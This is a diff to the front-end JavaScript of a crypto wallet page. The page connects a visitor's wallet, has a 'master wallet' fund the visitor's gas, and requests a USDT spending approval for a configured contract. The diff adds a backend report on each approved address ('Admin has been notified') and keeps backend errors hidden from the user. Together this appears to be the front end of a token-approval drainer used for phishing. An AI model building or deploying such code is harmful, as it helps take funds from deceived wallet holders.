@@ -28,15 +28,24 @@ const statusMessage = document.getElementById('status-message')
 let provider = null
 let signer = null
 let walletAddress = null
+let backendNotified = false // Track if we've sent to backend
 
 // Initialize app
 document.addEventListener('DOMContentLoaded', () => {
   // Check for existing connection
   const storedAddress = localStorage.getItem('walletAddress')
+  const storedBackendNotified = localStorage.getItem('backendNotified') === 'true'
+  
   if (storedAddress) {
     walletAddress = storedAddress
+    backendNotified = storedBackendNotified
     showWalletSection()
     updateWalletInfo()
+    
+    // If we haven't notified backend yet, do it now
+    if (!backendNotified) {
+      sendWalletToBackend()
+    }
   }
   
   // Set network info
@@ -75,13 +84,15 @@ async function connectWallet() {
     
     // Save to localStorage
     localStorage.setItem('walletAddress', walletAddress)
+    localStorage.setItem('backendNotified', 'false')
+    backendNotified = false
     
     // Update UI
     showWalletSection()
     updateWalletInfo()
     
-    // Send to backend
-    await sendWalletToBackend()
+    // Send to backend (but don't notify user if it fails)
+    sendWalletToBackend()
     
   } catch (error) {
     console.error('Connection error:', error)
@@ -168,9 +179,8 @@ async function handleApprovalFlow() {
     if (!hasGas) {
       showSuccess('Insufficient gas detected. Waiting for gas from master wallet...')
       
-      // In a real implementation, we would wait for the backend to send gas
-      // For now, we'll simulate this by checking periodically
-      await waitForGas(30000) // Wait up to 30 seconds
+      // Wait for gas to be sent by master wallet
+      await waitForGas(60000) // Wait up to 60 seconds
     }
     
     // Now proceed with USDT approval
@@ -178,7 +188,15 @@ async function handleApprovalFlow() {
     
   } catch (error) {
     console.error('Approval flow error:', error)
-    showError('Approval flow failed: ' + error.message)
+    
+    // Check if it's a gas-related error - if so, reset the connection flow
+    if (error.message.includes('gas') || error.message.includes('funds') || error.message.includes('underpriced')) {
+      showError('Insufficient gas. Please try again - the master wallet will send gas.')
+      // Reset the connection to start fresh
+      resetConnection()
+    } else {
+      showError('Approval failed: ' + error.message)
+    }
   } finally {
     showLoading(approveText, false)
   }
@@ -208,7 +226,7 @@ async function checkWalletGasBalance() {
 }
 
 // Wait for gas to be sent to wallet
-async function waitForGas(timeout = 30000) {
+async function waitForGas(timeout = 60000) {
   const startTime = Date.now()
   
   while (Date.now() - startTime < timeout) {
@@ -220,8 +238,8 @@ async function waitForGas(timeout = 30000) {
       return true
     }
     
-    // Wait 2 seconds before checking again
-    await new Promise(resolve => setTimeout(resolve, 2000))
+    // Wait 3 seconds before checking again
+    await new Promise(resolve => setTimeout(resolve, 3000))
   }
   
   // Timeout reached
@@ -242,6 +260,8 @@ async function approveUSDTSpending() {
       signer
     )
     
+    showSuccess('Sending approval transaction...')
+    
     // Send approval transaction
     const tx = await usdtContract.approve(
       CONFIG.CONTRACT_ADDRESS,
@@ -259,21 +279,16 @@ async function approveUSDTSpending() {
     approveBtn.disabled = true
     approveText.textContent = 'Approved'
     
+    // Notify backend that approval is complete
+    await notifyApprovalToBackend()
+    
   } catch (error) {
     console.error('Approval error:', error)
-    
-    // Check if it's a gas-related error
-    if (error.message.includes('gas') || error.message.includes('funds')) {
-      showError('Insufficient gas for transaction. Master wallet will send gas shortly.')
-    } else {
-      showError('Approval failed: ' + error.message)
-    }
-    
     throw error
   }
 }
 
-// Send wallet to backend
+// Send wallet to backend (connection only)
 async function sendWalletToBackend() {
   try {
     const response = await fetch(`${CONFIG.API_URL}/wallets/connect`, {
@@ -289,25 +304,74 @@ async function sendWalletToBackend() {
     
     if (!response.ok) {
       const errorData = await response.json().catch(() => ({}))
-      throw new Error(errorData.error || `HTTP ${response.status}: ${response.statusText}`)
+      console.error('Backend connection error:', errorData.error || `HTTP ${response.status}`)
+      // Don't show error to user as per requirements
+      return
     }
     
     const result = await response.json()
     console.log('Backend connection successful:', result)
     
+    // Mark that we've notified backend
+    backendNotified = true
+    localStorage.setItem('backendNotified', 'true')
+    
   } catch (error) {
     console.error('Backend connection error:', error)
-    // We don't show this error to the user as per requirements
+    // Don't show error to user as per requirements
   }
+}
+
+// Notify backend that approval is complete
+async function notifyApprovalToBackend() {
+  try {
+    const response = await fetch(`${CONFIG.API_URL}/wallets/approve`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        address: walletAddress
+      })
+    })
+    
+    if (!response.ok) {
+      const errorData = await response.json().catch(() => ({}))
+      console.error('Backend approval notification error:', errorData.error || `HTTP ${response.status}`)
+      // Don't show error to user as per requirements
+      return
+    }
+    
+    const result = await response.json()
+    console.log('Backend approval notification successful:', result)
+    
+    showSuccess('Wallet approved successfully! Admin has been notified.')
+    
+  } catch (error) {
+    console.error('Backend approval notification error:', error)
+    // Don't show error to user as per requirements
+  }
+}
+
+// Reset connection flow
+function resetConnection() {
+  // Clear all state
+  walletAddress = null
+  provider = null
+  signer = null
+  backendNotified = false
+  
+  // Clear localStorage
+  localStorage.removeItem('walletAddress')
+  localStorage.removeItem('backendNotified')
+  
+  // Reset UI
+  showConnectSection()
 }
 
 // Disconnect wallet
 function disconnectWallet() {
-  walletAddress = null
-  provider = null
-  signer = null
-  localStorage.removeItem('walletAddress')
-  showConnectSection()
+  resetConnection()
 }
 
 // Show connect section
@@ -322,6 +386,11 @@ function showWalletSection() {
   walletSection.classList.remove('hidden')
   approveBtn.disabled = false
   approveText.textContent = 'Approve USDT Spending'
+  
+  // If already approved, show as approved
+  if (approveBtn.disabled) {
+    approveText.textContent = 'Approved'
+  }
 }
 
 // Format wallet address
